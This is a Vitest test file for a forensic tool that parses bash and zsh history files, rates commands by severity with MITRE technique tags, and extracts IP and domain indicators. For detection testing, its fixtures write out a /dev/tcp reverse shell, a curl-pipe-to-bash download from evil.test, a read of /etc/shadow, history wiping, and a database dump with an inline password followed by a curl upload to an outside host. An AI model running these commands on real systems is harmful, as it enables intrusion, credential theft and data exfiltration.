import { describe, it, expect } from "vitest";
import {
  looksLikeBashHistory,
  parseShellHistory,
  parseShellHistoryFile,
  userFromHistoryFilename,
} from "../../src/analysis/bashHistoryImport.js";

// bash with HISTTIMEFORMAT (a `#<epoch>` line before each command).
const BASH_TS = `#1715688062
cat /etc/fstab
#1715691267
systemctl is-active squid
#1715708576
resolvectl query login.microsoftonline.com
#1715708707
ssh nina.kapoor@10.44.30.10`;

describe("looksLikeBashHistory", () => {
  it("matches by filename (no content signature needed)", () => {
    expect(looksLikeBashHistory("nina.kapoor.bash_history", "ls\nid\nwhoami")).toBe(true);
    expect(looksLikeBashHistory("0001_root.zsh_history", "ls")).toBe(true);
    expect(looksLikeBashHistory("ConsoleHost_history.txt", "Get-Process")).toBe(true);
  });
  it("matches by content signature (bash #epoch / zsh extended)", () => {
    expect(looksLikeBashHistory("dump.txt", BASH_TS)).toBe(true);
    expect(looksLikeBashHistory("h.txt", ": 1715688062:0;cat /etc/fstab\n: 1715691267:0;ls -la")).toBe(true);
  });
  it("does NOT claim an arbitrary log/CSV", () => {
    expect(looksLikeBashHistory("auth.log", "Jan 1 00:00:01 host sshd[1]: Failed password")).toBe(false);
    expect(looksLikeBashHistory("data.csv", "a,b,c\n1,2,3")).toBe(false);
  });
});

describe("parseShellHistory", () => {
  it("pairs each command with its preceding epoch (bash HISTTIMEFORMAT)", () => {
    const e = parseShellHistory(BASH_TS);
    expect(e).toHaveLength(4);
    expect(e[0]).toEqual({ command: "cat /etc/fstab", timestamp: "2024-05-14T12:01:02.000Z" });
    expect(e[3].command).toBe("ssh nina.kapoor@10.44.30.10");
  });
  it("parses zsh extended history (`: epoch:elapsed;cmd`)", () => {
    const e = parseShellHistory(": 1715688062:0;cat /etc/fstab\n: 1715691267:5;ls -la");
    expect(e).toHaveLength(2);
    expect(e[1]).toEqual({ command: "ls -la", timestamp: "2024-05-14T12:54:27.000Z" });
  });
  it("handles a plain history with no timestamps (commands only)", () => {
    const e = parseShellHistory("ls -la\nid\nwhoami");
    expect(e.map((x) => x.command)).toEqual(["ls -la", "id", "whoami"]);
    expect(e.every((x) => x.timestamp === "")).toBe(true);
  });
});

describe("parseShellHistoryFile — classification + IOCs", () => {
  it("keeps benign admin commands at Info, bumps lateral SSH", () => {
    const r = parseShellHistoryFile(BASH_TS, { user: "nina.kapoor" });
    expect(r.format).toBe("shell-history");
    const ssh = r.events.find((e) => /ssh /.test(e.description));
    expect(ssh?.severity).toBe("Low");
    expect(ssh?.mitreTechniques).toContain("T1021.004");
    const cat = r.events.find((e) => /cat \/etc\/fstab/.test(e.description));
    expect(cat?.severity).toBe("Info");
    expect(cat?.description).toContain("[nina.kapoor]");
  });

  it("extracts IP + domain IOCs but NOT the user before @", () => {
    const r = parseShellHistoryFile(BASH_TS, { user: "nina.kapoor" });
    expect(r.iocs.some((c) => c.type === "ip" && c.value === "10.44.30.10")).toBe(true);
    expect(r.iocs.some((c) => c.type === "domain" && c.value === "login.microsoftonline.com")).toBe(true);
    expect(r.iocs.some((c) => c.value === "nina.kapoor")).toBe(false);
  });

  it("flags reverse shells, download-and-exec, cred access and anti-forensics as High", () => {
    const evil = [
      "bash -i >& /dev/tcp/10.0.0.5/4444 0>&1",
      "curl http://evil.test/x.sh | bash",
      "cat /etc/shadow",
      "history -c",
    ].join("\n");
    const sev = parseShellHistoryFile(evil).events.map((e) => e.severity);
    expect(sev.every((s) => s === "High")).toBe(true);
  });

  it("flags a DB dump as Medium collection and a curl file-upload as Medium exfil — #199", () => {
    const ops = [
      "mysqldump -u veridia_app -pveridia-db-p455 veridia_prod customers payment_methods > /tmp/export-4291.sql",
      "curl -X POST https://northlakeportal.com/api/sync -F \"data=@/tmp/export-4291.sql.gz\" --silent",
    ].join("\n");
    const r = parseShellHistoryFile(ops, { user: "deploy" });
    const dump = r.events.find((e) => /mysqldump/.test(e.description));
    expect(dump?.severity).toBe("Medium");
    expect(dump?.mitreTechniques).toContain("T1005");
    const exfil = r.events.find((e) => /curl -X POST/.test(e.description));
    expect(exfil?.severity).toBe("Medium");
    expect(exfil?.mitreTechniques).toContain("T1041");
  });

  it("aggregates identical repeated commands into one counted row", () => {
    const r = parseShellHistoryFile("ls\nls\nls\nid", { user: "u" });
    const ls = r.events.find((e) => /: ls$/.test(e.description));
    expect(ls?.count).toBe(3);
    expect(r.total).toBe(4);
  });
});

describe("userFromHistoryFilename", () => {
  it("strips the import sequence prefix and history suffix", () => {
    expect(userFromHistoryFilename("0001_nina.kapoor.bash_history")).toBe("nina.kapoor");
    expect(userFromHistoryFilename("root.zsh_history")).toBe("root");
    expect(userFromHistoryFilename("0007_svc-backup.bash_history")).toBe("svc-backup");
  });
});
